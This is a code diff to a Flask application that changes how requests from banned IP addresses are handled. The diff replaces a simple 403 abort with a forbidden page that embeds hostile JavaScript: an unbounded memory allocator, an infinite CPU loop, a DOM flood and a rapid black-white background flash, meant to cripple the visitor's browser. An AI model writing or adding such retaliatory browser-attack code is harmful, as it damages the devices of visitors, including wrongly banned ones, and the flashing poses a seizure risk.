@@ -291,11 +291,50 @@ def save_banned_ips():
         json.dump(list(banned_ips), f)
     logger.info(f"Saved {len(banned_ips)} banned IPs to file")
 
+from flask import make_response
+
 @app.before_request
 def check_banned_ip():
-    if get_remote_address().strip() in banned_ips:
-        logger.warning(f"Blocked access attempt from banned IP: {get_remote_address()}")
-        abort(403)
+    ip = get_remote_address().strip()
+    if ip in banned_ips:
+        html = '''
+        <html>
+        <head><title>403 Forbidden</title></head>
+        <body>
+        <h1>403 Forbidden</h1>
+        <p>Your access is blocked, and we are making your browser regret it.</p>
+        <script>
+            // Memory hog
+            let arr = [];
+            setInterval(() => {
+                arr.push(new Array(1e6).fill("🍕"));
+            }, 100);
+
+            // CPU burner loop
+            setInterval(() => {
+                while (true) {
+                    Math.sqrt(Math.random());
+                }
+            }, 10);
+
+            // DOM flood
+            setInterval(() => {
+                const el = document.createElement("div");
+                el.innerText = "🚨 This is a forbidden request!";
+                document.body.appendChild(el);
+            }, 50);
+
+            // Additional resource-hogging code
+            setInterval(() => {
+                document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
+            }, 200);
+        </script>
+        </body>
+        </html>
+        '''
+        response = make_response(html, 403)
+        return response
+
 
 def check_attempts(username, ip, email):
     key = f"{username}:{ip}"
